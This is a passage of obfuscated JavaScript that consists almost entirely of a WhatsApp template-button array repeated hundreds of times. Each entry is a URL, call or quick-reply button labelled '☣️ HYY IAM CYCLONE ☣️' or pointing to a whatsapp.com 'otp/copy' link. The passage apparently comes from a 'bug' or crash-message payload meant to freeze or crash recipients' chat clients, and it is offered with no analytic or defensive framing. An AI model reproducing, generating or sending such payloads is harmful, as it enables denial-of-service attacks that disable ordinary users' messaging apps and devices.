honeNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x